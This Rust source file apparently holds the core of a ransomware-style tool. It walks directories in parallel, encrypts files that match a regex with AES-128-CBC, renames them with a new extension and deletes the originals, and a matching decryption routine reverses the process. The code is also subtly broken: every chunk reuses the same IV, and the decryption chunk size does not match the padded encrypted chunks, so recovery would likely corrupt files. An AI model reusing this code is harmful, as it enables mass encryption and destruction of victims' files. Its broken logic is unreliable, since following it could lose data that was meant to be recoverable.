use std::fs;
use std::io;
use std::io::{Read, Write};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;

use byteorder::{LittleEndian, ReadBytesExt, WriteBytesExt};
use colored::Colorize;
use libaes::Cipher;
use num_cpus;
use rayon::ThreadPoolBuilder;
use rand::distributions::DistString;
use rand::Rng;
use regex::RegexSet;
use walkdir::WalkDir;


pub const SIZE_AES_IV: usize = 16;
pub const SIZE_AES_KEY: usize = libaes::AES_128_KEY_LEN;
pub const SIZE_AES_BLOCK: usize = 16;
pub const SIZE_READ: usize = 32768;
pub const SIZE_CHALLENGE: usize = 15; // 15 bytes due to PKCS#7 padding
pub const SIZE_CHALLENGE_ENCRYPTED: usize = SIZE_AES_BLOCK;
pub const SIZE_TMP_EXTENSION: usize = 8;


pub fn read_aes_key(path: &str, key: &mut [u8; SIZE_AES_KEY]) -> Result<(), io::Error> {
    let mut fin = fs::File::open(path)?;

    if fin.read(key)? != SIZE_AES_KEY {
        return Err(io::Error::new(
            io::ErrorKind::UnexpectedEof,
            "Failed to read AES key from file",
        ));
    }

    Ok(())
}

pub fn encrypt_file(path: &str, key: &[u8; SIZE_AES_KEY], extension: &str) -> Result<(), io::Error> {
    // Ensure temporary file is deleted on errors
    struct TmpDestroyer<'a> {
        path: &'a str,
    }

    impl<'a> Drop for TmpDestroyer<'a> {
        fn drop(&mut self) {
            let _ = fs::remove_file(self.path);
        }
    }

    crate::println_titled!("Encrypting", path);

    let mut fin = fs::File::open(path)?;

    let path_tmp = crate::concatenate!(
        path, &crate::gen_random_alnum!(SIZE_TMP_EXTENSION), path.len(), SIZE_TMP_EXTENSION
    );

    let mut fout = fs::File::create(&path_tmp)?;

    let _tmp_destroyer = TmpDestroyer { path: &path_tmp };

    let iv = crate::gen_random_bytes!(SIZE_AES_IV);
    let challenge = crate::gen_random_bytes!(SIZE_CHALLENGE);

    let cipher: Cipher = Cipher::new_128(key);
    let challenge_encrypted = cipher.cbc_encrypt(&iv, &challenge);

    fout.write_all(&iv)?;
    fout.write_all(&challenge_encrypted)?;
    fout.write_u32::<LittleEndian>(crc32fast::hash(&challenge))?;

    let mut buffer = [0u8; SIZE_READ];

    while let Ok(n) = fin.read(&mut buffer) {
        if n == 0 {
            break;
        }

        let cipher_block = cipher.cbc_encrypt(&iv, &buffer[..n]);
        fout.write_all(&cipher_block)?;

    }

    drop(fout);

    let path_out = crate::concatenate!(path, &extension, path.len(), extension.len());
    let _ = fs::rename(&path_tmp, &path_out);

    if ! path.eq(&path_out) {
        fs::remove_file(path)?;
    }

    Ok(())
}

pub fn decrypt_file(path: &str, key: &[u8; SIZE_AES_KEY], extension: &str) -> Result<(), io::Error> {
    // Ensure temporary file is deleted on errors
    struct TmpDestroyer<'a> {
        path: &'a str,
    }

    impl<'a> Drop for TmpDestroyer<'a> {
        fn drop(&mut self) {
            let _ = fs::remove_file(self.path);
        }
    }

    crate::println_titled!("Decrypting", path);

    let mut fin = fs::File::open(path)?;

    let path_tmp = crate::concatenate!(
        path, &crate::gen_random_alnum!(SIZE_TMP_EXTENSION), path.len(), SIZE_TMP_EXTENSION
    );

    let mut fout = fs::File::create(&path_tmp)?;

    let _tmp_destroyer = TmpDestroyer { path: &path_tmp };

    let mut iv = [0u8; SIZE_AES_IV];
    let mut encrypted_challenge = [0u8; SIZE_CHALLENGE_ENCRYPTED];

    fin.read_exact(&mut iv[..])?;
    fin.read_exact(&mut encrypted_challenge[..])?;

    let cipher: Cipher = Cipher::new_128(key);
    let decrypted_challenge = cipher.cbc_decrypt(&iv, &encrypted_challenge);

    if fin.read_u32::<LittleEndian>()? != crc32fast::hash(&decrypted_challenge) {
        return Err(io::Error::new(io::ErrorKind::InvalidData, "CRC check failed"));
    }

    let mut buffer = [0u8; SIZE_READ];

    while let Ok(n) = fin.read(&mut buffer) {
        if n == 0 {
            break;
        }

        let cipher_block = cipher.cbc_decrypt(&iv, &buffer[..n]);
        fout.write_all(&cipher_block)?;
    }

    drop(fout);

    let mut path_out = path;

    if let Some(s) = path.strip_suffix(extension) {
        path_out = s;
    }

    let _ = fs::rename(&path_tmp, path_out);

    if ! path.eq(path_out) {
        fs::remove_file(path)?;
    }

    Ok(())
}

pub fn encrypt_directory(path: &str, key: &[u8; SIZE_AES_KEY], extension: &str, regex: &RegexSet) -> Result<usize, io::Error> {
    let counter = Arc::new(AtomicUsize::new(0));
    let private_counter = Arc::clone(&counter);

    let num_threads = num_cpus::get();

    let pool = match ThreadPoolBuilder::new().num_threads(num_threads).build() {
        Ok(tp) => tp,
        Err(e) => {
            return Err(io::Error::new(
                io::ErrorKind::Other, format!("Failed to build thread pool: {}\n", e)
            ));
        }
    };

    pool.scope(|s| {
        for entry in WalkDir::new(path).into_iter().filter_map(Result::ok) {
            if ! entry.file_type().is_file() {
                continue;
            }

            if ! regex.is_match(entry.path().file_name().unwrap().to_str().unwrap()) {
                continue;
            }

            let counter = Arc::clone(&counter);

            s.spawn(move |_| {
                let entry_path_str = entry.path().to_str().unwrap();

                match encrypt_file(entry_path_str, key, extension) {
                    Ok(_)  => {
                        counter.fetch_add(1, Ordering::Relaxed);
                    },
                    Err(e) => {
                        crate::println_error!(e);
                        println!();
                    }
                }
            });
        }
    });

    Ok(private_counter.load(Ordering::Relaxed))
}

pub fn decrypt_directory(path: &str, key: &[u8; SIZE_AES_KEY], extension: &str, regex: &RegexSet) -> Result<usize, io::Error> {
    let counter = Arc::new(AtomicUsize::new(0));
    let private_counter = Arc::clone(&counter);

    let num_threads = num_cpus::get();

    let pool = match ThreadPoolBuilder::new().num_threads(num_threads).build() {
        Ok(tp) => tp,
        Err(e) => {
            return Err(io::Error::new(
                io::ErrorKind::Other, format!("Failed to build thread pool: {}\n", e)
            ));
        }
    };

    pool.scope(|s| {
        for entry in WalkDir::new(path).into_iter().filter_map(Result::ok) {
            if ! entry.file_type().is_file() {
                continue;
            }

            if ! regex.is_match(entry.path().file_name().unwrap().to_str().unwrap()) {
                continue;
            }

            let counter = Arc::clone(&counter);

            s.spawn(move |_| {
                let entry_path_str = entry.path().to_str().unwrap();

                match decrypt_file(entry_path_str, key, extension) {
                    Ok(_)  => {
                        counter.fetch_add(1, Ordering::Relaxed);
                    },
                    Err(e) => {
                        crate::println_error!(e);
                        println!();
                    }
                }
            });
        }
    });

    Ok(private_counter.load(Ordering::Relaxed))
}
